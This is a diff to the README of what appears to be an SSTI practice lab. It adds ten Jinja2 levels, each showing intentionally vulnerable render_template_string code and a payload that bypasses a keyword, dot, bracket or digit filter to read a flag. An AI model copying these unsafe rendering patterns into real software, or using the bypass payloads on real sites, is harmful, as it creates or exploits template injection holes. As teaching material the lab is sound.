@@ -4,7 +4,7 @@ A comprehensive learning environment for practicing Server-Side Template Injecti
 
 ## Overview
 
-This application contains **10 progressive levels** of SSTI vulnerabilities, each demonstrating different aspects of template injection attacks. The levels range from basic template injection to advanced bypass techniques.
+This application contains **20 progressive levels** of SSTI vulnerabilities, each demonstrating different aspects of template injection attacks. The levels range from basic template injection to advanced bypass techniques.
 
 ## Setup
 
@@ -264,6 +264,165 @@ processed_result = render_template_string(template_str, ctx=ctx)
 
 ---
 
+### Level 11: Debug Renderer
+**Difficulty:** Beginner
+
+**Vulnerability:** Direct template rendering with sensitive context
+
+**Vulnerable Code:**
+```python
+rendered_output = render_template_string(template_input, user='Guest', flag=flag)
+```
+
+**Exploitation:**
+- Input: `{{ flag }}` → Returns the flag value
+
+**Learning Objective:** Confirm unsafe rendering of user-controlled templates.
+
+---
+
+### Level 12: Key Splitter
+**Difficulty:** Medium
+
+**Vulnerability:** Keyword block bypass via concatenation
+
+**Blocked Pattern:** `flag`
+
+**Vulnerable Code:**
+```python
+if 'flag' not in template_input.lower():
+    rendered_output = render_template_string(template_input, context=context)
+```
+
+**Exploitation:**
+- Input: `{{ context['f' ~ 'lag'] }}` → Bypass keyword filter
+
+**Learning Objective:** Use string concatenation to evade keyword blacklists.
+
+---
+
+### Level 13: Dotless Vault
+**Difficulty:** Medium
+
+**Vulnerability:** Attribute access despite dot removal
+
+**Filter:** Removes `.` characters
+
+**Exploitation:**
+- Input: `{{ vault|attr('flag') }}` → Access attribute without dot
+
+**Learning Objective:** Leverage Jinja filters to bypass operator restrictions.
+
+---
+
+### Level 14: Bracketless Getter
+**Difficulty:** Medium
+
+**Vulnerability:** Dict access via method call
+
+**Filters:** Blocks `flag` keyword and removes `[` `]`
+
+**Exploitation:**
+- Input: `{{ data.get('f' ~ 'lag') }}` → Access key without brackets
+
+**Learning Objective:** Use method calls to bypass bracket filtering.
+
+---
+
+### Level 15: Double Render
+**Difficulty:** Hard
+
+**Vulnerability:** Two-pass rendering
+
+**Vulnerable Code:**
+```python
+stage_one = render_template_string(template_input)
+rendered_output = render_template_string(stage_one, flag=flag)
+```
+
+**Exploitation:**
+- Input: `{{ '{{ flag }}' }}` → Deferred execution on second pass
+
+**Learning Objective:** Recognize and exploit double-render patterns.
+
+---
+
+### Level 16: Macro Lab
+**Difficulty:** Hard
+
+**Vulnerability:** User-controlled macro body
+
+**Vulnerable Code:**
+```python
+template = "{% macro report(user) %}" + macro_body + "{% endmacro %}{{ report('guest') }}"
+```
+
+**Exploitation:**
+- Input: `{{ flag }}` → Macro executes injected template code
+
+**Learning Objective:** Exploit injection points inside macro definitions.
+
+---
+
+### Level 17: Statement Breakout
+**Difficulty:** Hard
+
+**Vulnerability:** Template statement injection
+
+**Vulnerable Code:**
+```python
+template = "{% set msg = '" + msg + "' %}Message: {{ msg }}"
+```
+
+**Exploitation:**
+- Input: `x' %}{{ flag }}{%` → Break out of string and execute template
+
+**Learning Objective:** Understand statement breakout payloads.
+
+---
+
+### Level 18: Index Escape
+**Difficulty:** Hard
+
+**Vulnerability:** Digit filter bypass
+
+**Filter:** Blocks numeric characters
+
+**Exploitation:**
+- Input: `{{ flags['a'|length] }}` → Uses length to generate index
+
+**Learning Objective:** Bypass digit filters with computed values.
+
+---
+
+### Level 19: Attribute Mapper
+**Difficulty:** Expert
+
+**Vulnerability:** Attribute mapping without direct access
+
+**Filters:** Blocks `flag` keyword and removes dots
+
+**Exploitation:**
+- Input: `{{ users|map(attribute=('f' ~ 'lag'))|list }}` → Map attribute across list
+
+**Learning Objective:** Use higher-order filters to access protected fields.
+
+---
+
+### Level 20: Chain Bypass
+**Difficulty:** Expert
+
+**Vulnerability:** Chained filter bypass
+
+**Filters:** Blocks `flag`, `.`, `[`, `]`
+
+**Exploitation:**
+- Input: `{{ store|attr('get')('f' ~ 'lag') }}` → Chain filters and concat
+
+**Learning Objective:** Combine multiple bypass techniques in a restricted context.
+
+---
+
 ## SSTI Validation Cheat Sheet
 
 ### Basic Jinja2 Syntax
@@ -363,7 +522,7 @@ This application is intended for **educational purposes only**. It demonstrates 
 **© sondt (Administrator) // All Rights Reserved**
 
 
-  10 SSTI Levels Overview
+  20 SSTI Levels Overview
 
   | Level | Name                  | Vulnerability Type               |
   |-------|-----------------------|----------------------------------|
@@ -377,3 +536,13 @@ This application is intended for **educational purposes only**. It demonstrates 
   | 8     | Helper Exposure       | Context Helper Leak              |
   | 9     | Stored Template       | Second-Order SSTI                |
   | 10    | Blacklist Renderer    | Blacklist Filter SSTI            |
+  | 11    | Debug Renderer        | Direct Template Rendering        |
+  | 12    | Key Splitter          | Keyword Filter Bypass            |
+  | 13    | Dotless Vault         | Attribute Filter Bypass          |
+  | 14    | Bracketless Getter    | Dict Getter Bypass               |
+  | 15    | Double Render         | Two-Pass Rendering               |
+  | 16    | Macro Lab             | Macro Injection                  |
+  | 17    | Statement Breakout    | Template Statement Injection     |
+  | 18    | Index Escape          | Digit Filter Bypass              |
+  | 19    | Attribute Mapper      | Attribute Mapping                |
+  | 20    | Chain Bypass          | Chained Filter Bypass            |
